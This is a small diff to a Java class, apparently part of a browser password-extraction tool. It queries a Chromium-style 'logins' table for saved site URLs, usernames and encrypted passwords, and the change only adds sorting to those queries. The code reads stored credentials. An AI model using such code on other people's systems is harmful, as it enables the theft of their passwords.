@@ -41,10 +41,10 @@ public class jdec extends Crypt32Util {
 		Statement stmt2 = conn.createStatement();
 		Statement stmt3 = conn.createStatement();
 		Statement stmt4 = conn.createStatement();
-		String sqlurls = "SELECT origin_url FROM logins";
-		String sqlusernames = "SELECT username_value FROM logins";
-		String sqlpassblobs = "SELECT password_value FROM logins";
-		String count = "SELECT COUNT(username_value) FROM logins";
+		String sqlurls = "SELECT origin_url FROM logins ORDER BY username_value";
+		String sqlusernames = "SELECT username_value FROM logins ORDER BY username_value";
+		String sqlpassblobs = "SELECT password_value FROM logins ORDER BY username_value";
+		String count = "SELECT COUNT(username_value) FROM logins ORDER BY username_value";
 		ResultSet dbcount = stmt4.executeQuery(count);
 		int cint = dbcount.getInt(1);
 	
